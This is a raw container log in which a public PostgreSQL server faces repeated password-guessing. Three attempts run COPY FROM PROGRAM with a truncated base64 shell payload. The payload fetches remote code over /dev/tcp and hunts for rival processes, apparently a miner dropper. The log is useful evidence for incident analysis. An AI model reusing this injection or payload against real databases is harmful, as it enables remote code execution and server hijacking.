nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
db-1     | 2026-06-21 07:52:25.758 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 07:52:25.760 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 07:52:25.799 UTC [2041] LOG:  database system was interrupted; last known up at 2026-06-21 07:18:52 UTC
db-1     | 2026-06-21 07:52:25.889 UTC [2041] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 07:52:25.894 UTC [2041] LOG:  redo starts at 0/1CD8730
db-1     | 2026-06-21 07:52:25.895 UTC [2041] LOG:  invalid record length at 0/1CD8768: expected at least 24, got 0
db-1     | 2026-06-21 07:52:25.896 UTC [2041] LOG:  redo done at 0/1CD8730 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 07:52:25.907 UTC [2042] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 07:52:25.930 UTC [2042] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.004 s, total=0.027 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1CD8768, redo lsn=0/1CD8768
db-1     | 2026-06-21 07:52:25.936 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 07:53:52.866 UTC [2047] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 07:53:52.866 UTC [2047] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 07:54:29.298 UTC [2048] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 07:54:29.298 UTC [2048] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 07:54:32.845 UTC [2049] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 07:54:32.845 UTC [2049] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 07:55:25.331 UTC [2050] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 07:55:25.331 UTC [2050] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 07:56:57.711 UTC [2051] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 07:56:57.711 UTC [2051] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 07:58:30.861 UTC [2052] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 07:58:30.861 UTC [2052] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:00:03.845 UTC [2053] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:00:03.845 UTC [2053] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:00:28.789 UTC [2054] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:00:28.789 UTC [2054] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:00:48.855 UTC [2055] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:00:48.855 UTC [2055] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:01:12.247 UTC [1] LOG:  server process (PID 2056) was terminated by signal 9: Killed
db-1     | 2026-06-21 08:01:12.247 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 08:01:12.248 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 08:01:12.253 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 08:01:12.297 UTC [2058] LOG:  database system was interrupted; last known up at 2026-06-21 07:52:25 UTC
db-1     | 2026-06-21 08:01:12.404 UTC [2058] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 08:01:12.415 UTC [2058] LOG:  redo starts at 0/1CD87E0
db-1     | 2026-06-21 08:01:12.416 UTC [2058] LOG:  invalid record length at 0/1CD8818: expected at least 24, got 0
db-1     | 2026-06-21 08:01:12.416 UTC [2058] LOG:  redo done at 0/1CD87E0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 08:01:12.433 UTC [2059] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 08:01:12.482 UTC [2059] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.014 s, sync=0.003 s, total=0.055 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1CD8818, redo lsn=0/1CD8818
db-1     | 2026-06-21 08:01:12.493 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 08:01:36.814 UTC [2064] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:01:36.814 UTC [2064] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:03:09.864 UTC [2065] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:03:09.864 UTC [2065] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:04:42.629 UTC [2066] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:04:42.629 UTC [2066] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:06:15.637 UTC [2067] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:06:15.637 UTC [2067] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:07:10.772 UTC [2068] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:07:10.772 UTC [2068] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:07:11.509 UTC [2069] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:07:11.509 UTC [2069] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:07:12.932 UTC [1] LOG:  server process (PID 2070) was terminated by signal 9: Killed
db-1     | 2026-06-21 08:07:12.932 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 08:07:12.932 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 08:07:12.935 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 08:07:12.973 UTC [2076] LOG:  database system was interrupted; last known up at 2026-06-21 08:01:12 UTC
db-1     | 2026-06-21 08:07:13.062 UTC [2076] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 08:07:13.070 UTC [2076] LOG:  redo starts at 0/1CD8890
db-1     | 2026-06-21 08:07:13.071 UTC [2076] LOG:  invalid record length at 0/1CD88C8: expected at least 24, got 0
db-1     | 2026-06-21 08:07:13.071 UTC [2076] LOG:  redo done at 0/1CD8890 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 08:07:13.086 UTC [2077] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 08:07:13.137 UTC [2077] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.015 s, sync=0.004 s, total=0.058 s; sync files=2, longest=0.003 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1CD88C8, redo lsn=0/1CD88C8
db-1     | 2026-06-21 08:07:13.147 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 08:07:48.916 UTC [2082] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:07:48.916 UTC [2082] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:09:21.467 UTC [2083] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:09:21.467 UTC [2083] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:10:54.009 UTC [2084] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:10:54.009 UTC [2084] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:12:26.583 UTC [2085] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:12:26.583 UTC [2085] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:13:58.951 UTC [2086] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:13:58.951 UTC [2086] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:14:01.377 UTC [2087] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:14:01.377 UTC [2087] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:14:04.201 UTC [2088] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:14:04.201 UTC [2088] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:15:31.403 UTC [2089] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:15:31.403 UTC [2089] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:15:48.090 UTC [2090] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:15:48.090 UTC [2090] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:16:00.079 UTC [2091] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:16:00.079 UTC [2091] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:17:03.849 UTC [2092] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:17:03.849 UTC [2092] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:18:36.294 UTC [2093] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:18:36.294 UTC [2093] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:20:09.238 UTC [2094] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:20:09.238 UTC [2094] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:20:58.810 UTC [2095] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:20:58.810 UTC [2095] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:21:01.200 UTC [2096] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:21:01.200 UTC [2096] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:21:41.980 UTC [2097] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:21:41.980 UTC [2097] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:22:46.185 UTC [2098] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:22:46.185 UTC [2098] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:22:52.350 UTC [2099] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:22:52.350 UTC [2099] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:23:15.264 UTC [2100] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:23:15.264 UTC [2100] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:24:48.534 UTC [2101] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:24:48.534 UTC [2101] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:26:21.551 UTC [2102] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:26:21.551 UTC [2102] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:27:54.107 UTC [2104] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:27:54.107 UTC [2104] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:27:54.779 UTC [2103] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:27:54.779 UTC [2103] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:27:58.152 UTC [2105] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:27:58.152 UTC [2105] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:29:14.835 UTC [2106] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:29:14.835 UTC [2106] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:29:23.837 UTC [2107] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:29:23.837 UTC [2107] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:29:26.633 UTC [2108] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:29:26.633 UTC [2108] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:30:59.342 UTC [2109] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:30:59.342 UTC [2109] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:32:32.089 UTC [2110] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:32:32.089 UTC [2110] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:34:04.659 UTC [2111] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:34:04.659 UTC [2111] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:34:45.321 UTC [2112] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:34:45.321 UTC [2112] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:34:50.534 UTC [2113] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:34:50.534 UTC [2113] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:35:37.388 UTC [2114] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:35:37.388 UTC [2114] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:36:07.343 UTC [2115] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:36:07.343 UTC [2115] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:36:16.050 UTC [2116] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 08:36:16.050 UTC [2116] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:37:10.118 UTC [2117] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:37:10.118 UTC [2117] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:38:43.572 UTC [2118] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:38:43.572 UTC [2118] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:40:16.386 UTC [2119] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:40:16.386 UTC [2119] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:41:18.696 UTC [2120] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:41:18.696 UTC [2120] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:41:19.197 UTC [2121] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 08:41:19.197 UTC [2121] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:41:20.773 UTC [1] LOG:  server process (PID 2122) was terminated by signal 9: Killed
db-1     | 2026-06-21 08:41:20.773 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 08:41:20.773 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 08:41:20.776 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 08:41:20.815 UTC [2124] LOG:  database system was interrupted; last known up at 2026-06-21 08:07:13 UTC
db-1     | 2026-06-21 08:41:20.900 UTC [2124] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 08:41:20.906 UTC [2124] LOG:  redo starts at 0/1CD8940
db-1     | 2026-06-21 08:41:20.906 UTC [2124] LOG:  invalid record length at 0/1CD8978: expected at least 24, got 0
db-1     | 2026-06-21 08:41:20.906 UTC [2124] LOG:  redo done at 0/1CD8940 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 08:41:20.912 UTC [2125] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 08:41:20.936 UTC [2125] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.007 s, sync=0.004 s, total=0.026 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1CD8978, redo lsn=0/1CD8978
db-1     | 2026-06-21 08:41:20.942 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 08:41:49.101 UTC [2130] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:41:49.101 UTC [2130] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:43:21.756 UTC [2131] FATAL:  password authentication failed for user "demo"
db-1     | 2026-06-21 08:43:21.756 UTC [2131] DETAIL:  Role "demo" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 08:44:20.023 UTC [2132] FATAL:  password authentication failed for user "postgres"
